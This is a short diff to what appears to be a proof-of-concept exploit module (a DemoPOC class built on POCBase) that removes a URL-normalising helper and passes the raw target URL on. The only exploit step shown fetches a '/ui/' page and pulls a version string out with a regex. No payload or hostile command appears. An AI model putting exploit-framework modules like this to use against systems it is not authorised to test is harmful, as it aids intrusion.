@@ -27,21 +27,9 @@ class DemoPOC(POCBase):
     samples = []
     install_requires = ['']
 
-    def normalize_url(self):
-        schema = self.url.split('://')[0]
-        netloc = self.url.split('//')[-1].split('/')[0].split(':')
-        if len(netloc) > 1:
-            ip, port = netloc
-            if '443' in port:
-                schema = 'https'
-        else:
-            ip = netloc[0]
-            port = '80' if schema == 'http' else '443'
-        return '{0}://{1}:{2}'.format(schema, ip, port)
-
     def exploit(self, mode):
         result = {}
-        url = self.normalize_url()
+        url = self.url
 
         resp = requests.get(urljoin(url, '/ui/'))
         match = re.search(r"(\d+\.\d+\.\d+\.\d+)", resp.text)
